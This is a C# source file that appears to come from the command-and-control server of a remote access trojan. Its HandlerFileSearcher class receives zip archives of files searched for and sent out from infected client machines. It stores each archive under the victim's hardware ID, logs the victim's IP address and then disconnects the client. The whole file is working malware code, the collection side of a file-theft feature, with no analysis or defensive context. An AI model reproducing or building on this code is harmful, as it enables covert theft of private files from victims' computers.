using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet;

public class HandlerFileSearcher
{
	public async void SaveZipFile(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "FileSearcher");
			if (!Directory.Exists(fullPath))
			{
				Directory.CreateDirectory(fullPath);
			}
			await Task.Run(delegate
			{
				byte[] asBytes = unpack_msgpack.ForcePathObject("ZipFile").GetAsBytes();
				File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip", asBytes);
			});
			new HandleLogs().Addmsg("Client " + client.Ip + " file searcher was successfully @ ClientsFolder/" + unpack_msgpack.ForcePathObject("Hwid").AsString + "/FileSearcher", Color.Purple);
			client.Disconnected();
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg("FileSearcher " + ex.Message, Color.Red);
		}
	}
}
